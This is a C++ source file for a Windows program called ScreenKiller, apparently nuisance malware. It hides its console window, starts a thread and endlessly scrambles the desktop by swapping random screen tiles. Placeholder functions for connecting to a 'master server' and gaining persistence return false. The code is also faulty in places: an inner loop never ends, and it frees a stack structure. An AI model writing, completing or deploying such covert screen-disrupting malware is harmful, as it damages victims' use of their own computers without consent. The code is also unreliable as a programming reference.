#include <windows.h>
#include <iostream>
#include <thread>

#include "ScreenKiller.hpp"

VOID WINAPI ScrambleWindow(PScreenProps screen_props);

ScreenKiller::ScreenKiller() : m_alive(false), m_persistent(false), m_connected(false) {}

ScreenKiller::~ScreenKiller()
{
	this->suicide();
}

void ScreenKiller::deploy()
{
	this->m_alive = true;

	ShowWindow(GetConsoleWindow(), SW_HIDE);

	this->runner_thread = std::thread([this] {this->deploy_inner(); });
}

void ScreenKiller::suicide()
{
	this->runner_thread.detach();
	this->m_alive = false;
}

bool ScreenKiller::deploy_inner()
{
	this->connect_to_master_server();
	this->get_persistency();

	HWND hDesktop = NULL;
	ScreenProps screen_props = { 0 };
	hDesktop = GetDesktopWindow();

	screen_props.hdcScreen = GetDCEx(hDesktop, NULL, DCX_CACHE | DCX_LOCKWINDOWUPDATE);

	srand(GetCurrentTime());

	RECT desktop = { 0 };

	GetWindowRect(hDesktop, &(screen_props.rectScreen));

	while (this->m_alive)
	{
		ScrambleWindow(&screen_props);
		Sleep(10);
	}

	return true;
}

bool ScreenKiller::get_persistency()
{
	return false;
}

bool ScreenKiller::connect_to_master_server()
{
	return false;
}

VOID WINAPI ScrambleWindow(PScreenProps screen_props) 
{
	HDC hdcScreen = screen_props->hdcScreen;
	RECT rectScreen = screen_props->rectScreen;
	HDC hdcMemory = NULL;
	HBITMAP hBitmap = NULL;
	int iWidth, iHeight, iX1, iY1, iX2, iY2;

	hdcMemory = CreateCompatibleDC(hdcScreen);

	iWidth = abs(rectScreen.left - rectScreen.right) / DIVIDERS;
	iHeight = abs(rectScreen.top - rectScreen.bottom) / DIVIDERS;

	SelectObject(hdcMemory, hBitmap);

	while (TRUE)
	{
		iX1 = rectScreen.left + iWidth * (rand() % DIVIDERS);
		iX2 = rectScreen.left + iWidth * (rand() % DIVIDERS);
		iY1 = rectScreen.top + iHeight * (rand() % DIVIDERS);
		iY2 = rectScreen.top + iHeight * (rand() % DIVIDERS);

		BitBlt(hdcMemory, 0, 0, iWidth, iHeight, hdcScreen, iX1, iY1, SRCCOPY);
		BitBlt(hdcScreen, iX1, iY1, iWidth, iHeight, hdcScreen, iX2, iY2, SRCCOPY);
		BitBlt(hdcScreen, iX2, iY2, iWidth, iHeight, hdcMemory, 0, 0, SRCCOPY);

		Sleep(10);
	}

	DeleteDC(hdcMemory);
	DeleteObject(hBitmap);
	free(screen_props);
}
